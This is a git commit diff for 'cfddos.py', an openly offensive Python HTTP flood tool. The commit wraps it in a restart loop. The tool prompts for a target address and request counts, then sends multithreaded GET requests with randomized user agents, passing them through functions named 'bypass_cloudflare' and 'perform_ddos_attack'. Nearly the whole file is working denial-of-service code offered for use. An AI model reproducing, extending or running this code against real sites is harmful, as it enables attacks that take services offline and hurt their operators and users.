eaca9331885ce8b7ae69a75cb3a79e6c51603fd7
omicron <131537767+omicr0nn@users.noreply.github.com>
2023-12-14 21:08:18 +0300

    Update cfddos.py

--- cfddos.py
+++ cfddos.py
@@ -1,7 +1,7 @@
 import threading
 import requests
 from fake_useragent import UserAgent
-import os
+import os, time
 
 auth = ("""
 ▄▀▀▀▀▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▀▄    ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▀▄ 
@@ -15,42 +15,45 @@ auth = ("""
          \x1b[32mcoding \x1b[31mby \x1b[32momicr0n                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 """)
 
-os.system("cls||clear")
-print(auth)
-target_url = input("\033[32mEnter the anyone address: \x1b[0m").strip()
-num_threads = int(input("\033[32mHow many requests should it send per second: \x1b[0m").strip())
-num_requests = int(input("\033[32mHow many requests should be made in total: \x1b[0m").strip()) 
+while True:
+    os.system("cls||clear")
+    print(auth)
+    target_url = input("\033[32mEnter the anyone address: \x1b[0m").strip()
+    num_threads = int(input("\033[32mHow many requests should it send per second: \x1b[0m").strip())
+    num_requests = int(input("\033[32mHow many requests should be made in total: \x1b[0m").strip()) 
 
-def bypass_cloudflare(url):
-    headers = {'User-Agent': UserAgent().random}
-    response = requests.get(url, headers=headers)
-    return response.text
+    def bypass_cloudflare(url):
+        headers = {'User-Agent': UserAgent().random}
+        response = requests.get(url, headers=headers)
+        return response.text
 
-def perform_ddos_attack(target_url, num_requests, num_threads):
-    success_count = 0
-    failure_count = 0
-    lock = threading.Lock()
+    def perform_ddos_attack(target_url, num_requests, num_threads):
+        success_count = 0
+        failure_count = 0
+        lock = threading.Lock()
 
-    def worker():
-        nonlocal success_count, failure_count
-        for _ in range(num_requests // num_threads):
-            try:
-                bypassed_content = bypass_cloudflare(target_url)
-                with lock:
-                    success_count += 1
-                    print(f"\033[32m[+] Request successful: {success_count}")
-            except Exception as e:
-                with lock:
-                    failure_count += 1
-                    print(f"\033[31m[-] Failed request: {failure_count}")
+        def worker():
+            nonlocal success_count, failure_count
+            for _ in range(num_requests // num_threads):
+                try:
+                    bypassed_content = bypass_cloudflare(target_url)
+                    with lock:
+                        success_count += 1
+                        print(f"\033[32m[+] Request successful: {success_count}")
+                except Exception as e:
+                    with lock:
+                        failure_count += 1
+                        print(f"\033[31m[-] Failed request: {failure_count}")
 
-    threads = []
-    for _ in range(num_threads):
-        thread = threading.Thread(target=worker)
-        threads.append(thread)
-        thread.start()
+        threads = []
+        for _ in range(num_threads):
+            thread = threading.Thread(target=worker)
+            threads.append(thread)
+            thread.start()
 
-    for thread in threads:
-        thread.join()
+        for thread in threads:
+            thread.join()
 
-perform_ddos_attack(target_url, num_requests, num_threads)
+    perform_ddos_attack(target_url, num_requests, num_threads)
+    print("\n\x1b[31mthe program is restarting. Waiting for 5 seconds...\x1b[0m")
+    time.sleep(5)
